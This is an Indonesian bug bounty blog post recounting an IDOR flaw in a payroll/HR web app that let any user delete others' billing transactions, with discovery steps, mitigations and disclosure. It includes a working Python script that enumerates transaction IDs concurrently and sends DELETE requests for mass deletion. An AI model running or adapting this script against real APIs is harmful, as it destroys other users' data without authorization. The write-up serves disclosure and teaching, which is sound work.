+++
date = '2025-09-15T14:10:41Z'
draft = false
title = 'How I Found a Critical IDOR That Allowed Deleting All Billing Transactions'
+++
Halo semuanya! Kali ini saya ingin berbagi pengalaman menarik saat melakukan security testing pada suatu aplikasi web (private program) yang berfokus pada free payroll, absenteeism dan employee management.

Bayangkan ini, saya sedang mengeksplorasi sebuah aplikasi web tersebut untuk sekedar pengujian keamanan dan tiba-tiba menemukan sesuatu yang cukup mengejutkan. Sebuah kerentanan Insecure Direct Object Reference (IDOR) yang memungkinkan saya menghapus transaksi billing pengguna lain, tanpa ada otorisasi sama sekali.

Yup, benar-benar semua transaksi.

## Apa itu IDOR? Singkatnya?
IDOR (Insecure Direct Object Reference) adalah salah satu jenis kerentanan kelemahan kontrol akses di mana aplikasi mempercayai data yang dikirim pengguna, misalnya ID transaksi atau user ID, tanpa memastikan apakah pengguna tersebut memang berhak atas data itu.

Akibatnya, jika seseorang bisa menebak atau memodifikasi nilai ID di request, ia bisa mengakses, mengubah, bahkan menghapus data milik pengguna lain. Celah seperti ini sering muncul di API modern ketika validasi otorisasi hanya dilakukan di sisi client, tapi tidak di sisi server.

Dalam kasus temuan saya ini, jika kamu tahu ID riwayat transaksi pembayaran billing seseorang, kamu bisa menghapusnya. Tanpa izin, tanpa ada batasan.

## Menemukan "Pintu Rahasia" Endpoint Tersembunyi
Seperti biasa, saya login ke akun saya, buka **Pengaturan > Billing**. Saya melihat daftar riwayat transaksi, opsi membuat perpanjangan paket baru, tapi tidak ada tombol hapus.

*"Hmmm, apa mungkin fitur hapus memang sengaja disembunyikan dari user biasa, ah entahlah aku juga tidak tahu"* pikir saya.

Tapi, sebagai seorang bug hunter selalu penasaran. Jadi saya lanjut eksplorasi, **Pengaturan > Integrasi > Open API**. Di sana saya menemukan URL dokumentasi API. Awalnya, tidak ada yang menarik sama sekali. Tapi saya tidak menyerah.

Saat sesi eksplorasi, saya sempat mengambil screenshot halaman aplikasi yang menunjukkan tautan dokumentasi internal dengan path yang tampak seperti:

![URL Dokumen API](/images/url_dokumen_api.png)

Doc asli API: *![**https://private.com/documentation/hr**](none)*

Itu memberi petunjuk bahwa ada dokumentasi internal dan sebagai bug hunter, petunjuk sekecil apa pun bisa berarti pintu masuk. Saya lalu menebak varian URL yang umum dipakai untuk Open API / Swagger, dan setelah beberapa percobaan menemukan versi dokumentasi yang lengkap dan lebih “developer-centric”:

*![**https://private.com/docs/hr**](none)*

Di halaman **/docs/hr** itulah banyak endpoint API yang tidak terekspos di UI terlihat jelas termasuk endpoint yang langsung membuat saya was-was:

**`DELETE /app/billingTransactions/{id}`**

![endpoint api](/images/dokumen_api.png)

Penemuan ini sangat tipikal, dokumentasi internal atau file swagger yang dapat diakses (atau hampir dapat diakses) sering mengungkap endpoint yang tidak dimaksudkan untuk penggunaan publik. Jadi walaupun UI tidak menampilkan fitur delete, API backend ternyata menyediakan endpoint tersebut dan itu yang saya mulai uji.

## Saatnya Menguji: Apakah Endpoint Ini Berfungsi?

Menggunakan Burpsuite Repeater, saya membuat request DELETE sederhana. Response 200 OK. Berhasil. Tapi ini baru bukti endpoint ada, belum bukti IDOR.

Lanjut ke uji coba klasik: **menghapus riwayat transaksi milik pengguna lain**.

## Cross The Line: Exploit IDOR

*Etika: semua pengujian dilakukan menggunakan akun uji saya sendiri. Jangan melakukan pengujian yang merugikan orang lain selalu ikuti aturan program. Ingat, ada konsekuensi hukum jika melanggar aturan, jadi selalu hati-hati!*

Jadi, saya menyiapkan dua akun:
1. Attacker: akun saya
2. Victim: akun percobaan pengguna lain

### Langkahnya sangat sederhana:
1. Login dengan akun uji (attacker)
2. Kirim request DELETE transaction_id milik akun attacker, server merespons 200 OK.
3. Di Repeater tab ubah transaction_id menjadi ID lain (diasumsikan milik akun korban), kirim request dengan token attacker
4. Server merespons 200 OK lagi dan riwayat transaksi pada akun korban lenyap

Lihat screenshot pada gambar ini untuk detail request DELETE:

![request delete api](/images/delete_billing.png)

Observasi: respons sukses tanpa 403/401 dan tanpa indikasi bahwa ownership diperiksa. Akhirnya, IDOR sukses di exploitasi, mantap.

Setelah pengujian dirasa cukup, saya langsung menyusun laporan mengenai temuan ini dan segera melaporkannya kepada tim keamanan agar celah tersebut tidak disalahgunakan oleh pihak yang tidak bertanggung jawab.

## Kenapa Ini Berbahaya?

* Pengguna tidak sadar: Mereka tidak tahu fitur hapus ada. Tidak ada laporan.
* Developer blind spot: Endpoint ada tapi UI tidak menampilkannya. Developer mungkin lupa mengamankan.
* Mass deletion: Dengan script sederhana, ribuan transaksi bisa dihapus hanya dengan mengubah ID.
* Kehilangan integritas data: Bukti transaksi hilang, audit semua bisa kacau.

Severity: Saya menganggap High (bergantung criticaly data dan proses bisnis)

## Kenapa Bisa Terjadi?

Ya karena, tidak ada resource-level authorization (ownership check) pada endpoint destruktif. Terus juga ID resource bersifat enumerable (mis. integer incremental) mudah banget untuk ditebak dan API mengembalikan 200 untuk operasi yang "berhasil" tanpa menandai kasus non-owner vs not-found secara jelas.

## Rekomendasi Mitigasi

Perbaikan yang praktis dan bisa langsung di implementasikan:

* Ownership check sebelum melakukan DELETE
* Validasi otorisasi ketat di semua endpoint, bukan hanya yang terlihat di UI saja
* Rate limit dan monitoring endpoint yang menerima path param ID deteksi pola enumerasi (banyak DELETE berturut-turut dengan ID berurutan)
* Gunakan soft delete daripada menghapus data langsung
* Konsistenkan response codes: 403 Forbidden untuk akses non-owner; 404 Not Found jika resource tidak ada (sesuaikan kebijakan disclosure)
* Dan implementasi audit logging

Prinsipnya tetap sama, setiap endpoint yang memproses data baik yang terlihat di UI maupun tidak, harus memiliki validasi otorisasi yang ketat.

## Exploit Code

Saya tidak menjalankan kode ini karena melanggar etika dan aturan program. Kode ini hanya ditampilkan sebagai contoh (demo) untuk *mass deletion billing transactions* melalui IDOR, bukan untuk digunakan di sistem nyata.

$ python3 idor.py

```python

#!/usr/bin/env python3

import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

# Ignore SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_idor(session, billing_id):
    url = f"https://private.com/api/v1/app/billingTransactions/{billing_id}"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "application/json, text/plain, */*",
        "Authorization": "Bearer <token>",
        "X-App": "hr"
    }
    try:
        response = session.delete(url, headers=headers, verify=False)
        if response.status_code == 200:
            print(f"Success delete billing transaction: {billing_id}")
        else:
            print(f"Billing {billing_id} not found or cannot delete")
    except Exception as e:
        print(f"Error: {e}")

def main():
    max_workers = 10
    try:
        with requests.Session() as session:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Iterate over a squence of integers
                # range(999) -> 0, 1, 2, ..., 998
                executor.map(lambda i: exploit_idor(session, i), range(999))
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

## Pelajaran Penting

Security thorough obscurity is not security. Menyembunyikan endpoint di UI bukanlah pengaman. Anggap semua endpoint bisa ditemukan. Assume every endpoint is exposed. Semua endpoint, UI-visible atau tidak, harus aman.

Terkadang, banyak bug kritis muncul bukan karena kompleksitas, tapi karena lupa melakukan basic checks pada resource-level authorization.

---

Saya sudah melaporkan kerentanan ini dan perusahaan menanggapinya dengan cepat. Perbaikan telah diterapkan oleh team developernya. Dan ya, saya menerima **"bounty"** sebagai bentuk apresiasi, lumayan buat jajan hehe (merasa senang).

Momen seperti ini selalu bikin saya sadar. Dunia bug bounty selalu penuh kejutan, dan kadang bug paling kritis justru tersembunyi di *"hal-hal kecil yang tidak terlihat"*.

Terima kasih sudah meluangkan waktunya untuk membaca. Kalau ada yang mau didiskusikan atau hanya sekedar bertanya, follow saya di [X (Twitter)](https://x.com/@0xrohadi "0xrohadi") ya.

Have a good day!
